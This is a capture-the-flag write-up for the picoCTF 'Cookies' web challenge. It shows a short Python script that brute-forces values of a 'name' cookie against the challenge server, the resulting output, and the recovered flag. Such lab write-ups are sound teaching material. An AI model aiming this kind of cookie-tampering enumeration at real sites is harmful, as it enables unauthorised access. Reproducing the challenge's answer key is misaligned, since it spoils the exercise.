### cookies

we see two cookies set for this site but one of interest, name

"name" = -1

I tried initially some guesses like user, admin but nothing

so I decided to script guessing 1-100

I got the flag with name= 18

```py
#! /usr/bin/env python3

import requests

for i in range(100):
    r= requests.get(
        "http://mercury.picoctf.net:54219/check", 
        cookies= {"PHPSESSID": "j51jtluj8o6vr0c07njqt4umht",  "name": str(i)}
    )
    print(f"trying name {i}")

    if r.text.find('picoCTF{') != -1:
        print('found')
        print(r.text)
        break

```

```
trying name 0
trying name 1
trying name 2
trying name 3
trying name 4
trying name 5
trying name 6
trying name 7
trying name 8
trying name 9
trying name 10
trying name 11
trying name 12
trying name 13
trying name 14
trying name 15
trying name 16
trying name 17
trying name 18
found
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```

picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}